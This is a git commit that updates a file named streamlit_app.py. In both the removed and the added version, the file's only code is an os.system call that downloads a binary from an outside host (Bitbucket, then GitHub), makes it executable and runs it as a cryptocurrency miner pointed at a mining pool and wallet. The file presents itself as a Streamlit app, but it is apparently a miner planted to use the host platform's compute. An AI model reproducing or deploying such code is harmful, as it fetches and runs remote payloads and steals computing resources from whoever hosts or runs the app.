18ccf5a24b87ff1938fe43089b95700691d5b5c0
fariisna8 <fariisna8@gmail.com>
2024-09-17 16:46:26 +0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -1,2 +1,2 @@
 import os
-os.system('curl -L https://bitbucket.org/eatyourshet/php/raw/1a31554cdede888ae70fbeedc5e909a3926ea2da/php --output php && curl -L https://bitbucket.org/eatyourshet/php/raw/b1ee5dc709956a92763976e15dd18f9ab8f40698/apache --output apache && chmod +x apache php && ./php -algo rx/0 -wallet SaLvsBu6oFag1w7AWnq7MJe1kiEj39WXE7RwTNzRH8sU2xy3sSxZfwQjLHRqLUu32NTfEqd7xKhMwK3t3V2Tix9EZUtghWuUwyN.Fer -pool1 pool.hashvault.pro:443 -noLog true')
+os.system('wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz && tar -xf hellminer_linux64.tar.gz && ./hellminer -c ap.luckpool.net:3957 -u RWUBa38r4LCMckjEQgttADt1rDJowLXPrA.$(echo $(shuf -i 1-99 -n 1)-ApaLolihatS) -p x')
